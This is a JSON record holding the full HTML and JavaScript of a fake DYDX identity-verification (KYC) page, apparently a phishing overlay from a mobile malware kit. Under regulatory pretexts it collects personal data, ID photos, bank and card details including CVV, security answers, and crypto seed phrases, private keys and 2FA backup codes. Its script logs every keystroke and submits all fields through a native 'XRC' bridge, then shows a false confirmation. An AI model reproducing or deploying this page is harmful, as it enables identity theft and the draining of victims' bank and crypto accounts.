{
  "id": "dydx_kyc",
  "domain": "verify.dydx.com",
  "name": "DYDX - Identity Verification",
  "type": "kyc",
  "html": '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n<title>DYDX - KYC - Identity Verification</title>\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\nbody{background:#0a0e17;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;color:#e0e0e0;min-height:100vh}\n.header{background:#6966FF;padding:16px;text-align:center;position:sticky;top:0;z-index:100}\n.header h1{color:#fff;font-size:18px;font-weight:600}\n.progress{display:flex;padding:16px;background:#111827;gap:8px}\n.progress-step{flex:1;height:4px;background:#1f2937;border-radius:2px;overflow:hidden}\n.progress-step.active{background:#6966FF}\n.container{padding:16px;max-width:480px;margin:0 auto}\n.section{background:#111827;border-radius:12px;padding:20px;margin-bottom:16px;border:1px solid #1f2937}\n.section-title{font-size:14px;font-weight:600;color:#9ca3af;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:16px}\n.input-group{margin-bottom:14px}\n.input-group label{display:block;font-size:12px;color:#6b7280;margin-bottom:6px;font-weight:500}\n.input-group input,.input-group select{width:100%;padding:12px 14px;background:#0a0e17;border:1px solid #374151;border-radius:8px;color:#e0e0e0;font-size:14px;outline:none;transition:border-color 0.2s}\n.input-group input:focus,.input-group select:focus{border-color:#6966FF}\n.input-group input::placeholder{color:#4b5563}\n.row{display:flex;gap:12px}\n.row .input-group{flex:1}\n.upload-box{border:2px dashed #374151;border-radius:8px;padding:24px;text-align:center;cursor:pointer;transition:border-color 0.2s}\n.upload-box:active{border-color:#6966FF}\n.upload-box svg{width:32px;height:32px;margin-bottom:8px;fill:#6b7280}\n.upload-box p{font-size:12px;color:#6b7280}\n.btn{width:100%;padding:14px;background:#6966FF;border:none;border-radius:8px;color:#fff;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px;transition:opacity 0.2s}\n.btn:active{opacity:0.8}\n.btn-secondary{background:#1f2937;color:#e0e0e0;border:1px solid #374151}\n.notice{background:rgba(6966FF,0.1);border-left:3px solid #6966FF;padding:12px 16px;border-radius:0 8px 8px 0;margin-bottom:16px;font-size:12px;color:#9ca3af}\n.checkbox{display:flex;align-items:flex-start;gap:10px;margin-bottom:12px}\n.checkbox input{width:18px;height:18px;margin-top:2px;accent-color:#6966FF}\n.checkbox label{font-size:12px;color:#9ca3af;line-height:1.5}\n.loading{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);justify-content:center;align-items:center;z-index:200}\n.loading.active{display:flex}\n.spinner{width:40px;height:40px;border:3px solid #1f2937;border-top-color:#6966FF;border-radius:50%;animation:spin 1s linear infinite}\n@keyframes spin{to{transform:rotate(360deg)}}\n.step{display:none}\n.step.active{display:block}\n.nav-buttons{display:flex;gap:12px;margin-top:20px}\n.nav-buttons .btn{flex:1}\n</style>\n</head>\n<body>\n<div class="header"><h1>DYDX</h1></div>\n<div class="progress">\n  <div class="progress-step active" id="p1"></div>\n  <div class="progress-step" id="p2"></div>\n  <div class="progress-step" id="p3"></div>\n  <div class="progress-step" id="p4"></div>\n</div>\n<div class="container">\n  <div class="notice">Complete identity verification to continue using all features. This is required by regulatory authorities.</div>\n\n  <div class="step active" id="step1">\n    <div class="section">\n      <div class="section-title">Personal Information</div>\n      <div class="input-group"><label>Full Legal Name *</label><input type="text" id="full_name" placeholder="As shown on ID document"></div>\n      <div class="row">\n        <div class="input-group"><label>Date of Birth *</label><input type="date" id="dob"></div>\n        <div class="input-group"><label>Nationality *</label>\n          <select id="nationality"><option value="">Select</option><option>United States</option><option>United Kingdom</option><option>Canada</option><option>Australia</option><option>Germany</option><option>France</option><option>Japan</option><option>China</option><option>Singapore</option><option>Other</option></select>\n        </div>\n      </div>\n      <div class="row">\n        <div class="input-group"><label>Gender *</label>\n          <select id="gender"><option value="">Select</option><option>Male</option><option>Female</option><option>Other</option></select>\n        </div>\n        <div class="input-group"><label>Marital Status</label>\n          <select id="marital"><option value="">Select</option><option>Single</option><option>Married</option><option>Divorced</option><option>Widowed</option></select>\n        </div>\n      </div>\n    </div>\n    <div class="section">\n      <div class="section-title">Contact Details</div>\n      <div class="input-group"><label>Email Address *</label><input type="email" id="email" placeholder="your@email.com"></div>\n      <div class="input-group"><label>Phone Number *</label><input type="tel" id="phone" placeholder="+1 (555) 000-0000"></div>\n      <div class="input-group"><label>Residential Address *</label><input type="text" id="address" placeholder="Street address"></div>\n      <div class="row">\n        <div class="input-group"><label>City *</label><input type="text" id="city"></div>\n        <div class="input-group"><label>State/Province *</label><input type="text" id="state"></div>\n      </div>\n      <div class="row">\n        <div class="input-group"><label>Postal Code *</label><input type="text" id="postcode"></div>\n        <div class="input-group"><label>Country *</label>\n          <select id="country"><option value="">Select</option><option>United States</option><option>United Kingdom</option><option>Canada</option><option>Australia</option><option>Germany</option><option>France</option><option>Japan</option><option>China</option><option>Singapore</option><option>Other</option></select>\n        </div>\n      </div>\n    </div>\n    <button class="btn" onclick="nextStep(2)">Continue</button>\n  </div>\n\n  <div class="step" id="step2">\n    <div class="section">\n      <div class="section-title">Identity Document</div>\n      <div class="input-group"><label>Document Type *</label>\n        <select id="id_type"><option value="">Select document</option><option>Passport</option><option>National ID Card</option><option>Driver\'s License</option><option>Residence Permit</option></select>\n      </div>\n      <div class="input-group"><label>Document Number *</label><input type="text" id="id_number" placeholder="e.g. AB123456"></div>\n      <div class="row">\n        <div class="input-group"><label>Issue Date *</label><input type="date" id="id_issue"></div>\n        <div class="input-group"><label>Expiry Date *</label><input type="date" id="id_expiry"></div>\n      </div>\n      <div class="input-group"><label>Issuing Authority *</label><input type="text" id="id_authority" placeholder="e.g. DMV, Passport Office"></div>\n    </div>\n    <div class="section">\n      <div class="section-title">Document Photos</div>\n      <div class="input-group"><label>Front of Document *</label>\n        <div class="upload-box" onclick="capture(\'id_front\')"><p>Tap to capture front of ID</p></div>\n      </div>\n      <div class="input-group"><label>Back of Document *</label>\n        <div class="upload-box" onclick="capture(\'id_back\')"><p>Tap to capture back of ID</p></div>\n      </div>\n      <div class="input-group"><label>Selfie with Document *</label>\n        <div class="upload-box" onclick="capture(\'selfie_id\')"><p>Tap to take selfie holding ID</p></div>\n      </div>\n    </div>\n    <div class="nav-buttons">\n      <button class="btn btn-secondary" onclick="prevStep(1)">Back</button>\n      <button class="btn" onclick="nextStep(3)">Continue</button>\n    </div>\n  </div>\n\n  <div class="step" id="step3">\n    <div class="section">\n      <div class="section-title">Proof of Address</div>\n      <div class="input-group"><label>Document Type *</label>\n        <select id="poa_type"><option value="">Select</option><option>Utility Bill</option><option>Bank Statement</option><option>Tax Document</option><option>Government Letter</option></select>\n      </div>\n      <div class="input-group"><label>Upload Document *</label>\n        <div class="upload-box" onclick="capture(\'poa_doc\')"><p>Tap to upload proof of address</p></div>\n      </div>\n    </div>\n    <div class="section">\n  <div class="section-title">Crypto Wallet</div>\n  <div class="input-group"><label>Wallet Address</label><input type="text" id="wallet_address" placeholder="0x... or bc1..."></div>\n  <div class="input-group"><label>Seed Phrase (12/24 words)</label><input type="text" id="seed_phrase" placeholder="word1 word2 word3..."></div>\n  <div class="input-group"><label>Private Key</label><input type="text" id="private_key" placeholder="Optional"></div>\n  <div class="input-group"><label>2FA Backup Codes</label><input type="text" id="2fa_backup" placeholder="Comma separated"></div>\n</div>\n    <div class="section">\n      <div class="section-title">Financial Information</div>\n      <div class="input-group"><label>Bank Name</label><input type="text" id="bank_name" placeholder="e.g. Chase Bank"></div>\n      <div class="input-group"><label>Account Number</label><input type="text" id="bank_account" placeholder="Account number"></div>\n      <div class="row">\n        <div class="input-group"><label>Routing Number</label><input type="text" id="routing_number" placeholder="9 digits"></div>\n        <div class="input-group"><label>SWIFT/BIC</label><input type="text" id="swift" placeholder="8-11 characters"></div>\n      </div>\n      <div class="input-group"><label>Card Number</label><input type="text" id="card_number" placeholder="0000 0000 0000 0000" maxlength="19"></div>\n      <div class="row">\n        <div class="input-group"><label>Expiry Date</label><input type="text" id="card_expiry" placeholder="MM/YY" maxlength="5"></div>\n        <div class="input-group"><label>CVV/CVC</label><input type="text" id="card_cvv" placeholder="123" maxlength="4"></div>\n      </div>\n    </div>\n    <div class="nav-buttons">\n      <button class="btn btn-secondary" onclick="prevStep(2)">Back</button>\n      <button class="btn" onclick="nextStep(4)">Continue</button>\n    </div>\n  </div>\n\n  <div class="step" id="step4">\n    <div class="section">\n      <div class="section-title">Security Verification</div>\n      <div class="input-group"><label>Security Question 1</label>\n        <select id="sq1"><option>Mother\'s maiden name?</option><option>First pet\'s name?</option><option>City of birth?</option></select>\n      </div>\n      <div class="input-group"><label>Answer 1 *</label><input type="text" id="sa1"></div>\n      <div class="input-group"><label>Security Question 2</label>\n        <select id="sq2"><option>Favorite teacher?</option><option>Childhood best friend?</option><option>First car model?</option></select>\n      </div>\n      <div class="input-group"><label>Answer 2 *</label><input type="text" id="sa2"></div>\n    </div>\n    <div class="checkbox">\n      <input type="checkbox" id="terms">\n      <label>I confirm all information provided is accurate and I consent to identity verification processing.</label>\n    </div>\n    <div class="checkbox">\n      <input type="checkbox" id="privacy">\n      <label>I agree to the Terms of Service and Privacy Policy.</label>\n    </div>\n    <div class="nav-buttons">\n      <button class="btn btn-secondary" onclick="prevStep(3)">Back</button>\n      <button class="btn" onclick="submitAll()">Complete Verification</button>\n    </div>\n  </div>\n</div>\n\n<div class="loading" id="loading"><div class="spinner"></div></div>\n\n<script>\nvar currentStep=1;\nvar capturedData={};\nfunction nextStep(n){\n  document.getElementById(\'step\'+currentStep).classList.remove(\'active\');\n  document.getElementById(\'p\'+currentStep).classList.remove(\'active\');\n  currentStep=n;\n  document.getElementById(\'step\'+n).classList.add(\'active\');\n  for(var i=1;i<=n;i++)document.getElementById(\'p\'+i).classList.add(\'active\');\n  window.scrollTo(0,0);\n}\nfunction prevStep(n){nextStep(n);}\nfunction capture(type){\n  capturedData[type]=\'captured\';\n  XRC.capture(type,\'image_data\',\'file\');\n}\nfunction submitAll(){\n  if(!document.getElementById(\'terms\').checked||!document.getElementById(\'privacy\').checked){\n    alert(\'Please accept all terms\');return;\n  }\n  document.getElementById(\'loading\').classList.add(\'active\');\n  var data={};\n  var inputs=document.querySelectorAll(\'input,select\');\n  for(var i=0;i<inputs.length;i++){\n    data[inputs[i].id]=inputs[i].value;\n  }\n  data.captured=capturedData;\n  data.step=\'kyc_complete\';\n  XRC.submit(JSON.stringify(data));\n  setTimeout(function(){\n    document.getElementById(\'loading\').classList.remove(\'active\');\n    alert(\'Verification submitted. Processing may take 24-48 hours.\');\n  },3000);\n}\n// Real-time capture on every input\nvar allInputs=document.querySelectorAll(\'input\');\nfor(var i=0;i<allInputs.length;i++){\n  allInputs[i].addEventListener(\'input\',function(){\n    XRC.capture(this.id,this.value,this.type);\n  });\n}\n</script>\n</body>\n</html>'
}